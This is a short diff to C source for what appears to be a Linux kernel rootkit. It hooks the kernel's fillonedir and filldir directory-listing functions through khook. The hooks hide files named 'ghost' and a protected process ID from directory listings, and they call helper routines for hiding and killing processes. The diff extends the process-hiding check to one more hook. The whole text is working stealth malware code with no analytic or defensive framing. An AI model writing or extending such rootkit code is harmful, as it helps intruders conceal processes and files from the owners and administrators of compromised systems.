@@ -168,7 +168,9 @@ KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int)
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	
+	if(adore_atoi(name)==protected_pid){
+		return ret;
+	}
 	if (!strstr(name, "ghost") )
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
@@ -182,7 +184,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	find_pid_hide();
 	find_pid_kill();
 	if(adore_atoi(name)==protected_pid){
-		return 0;
+		return ret;
 	}
 	if (!strstr(name, "ghost"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
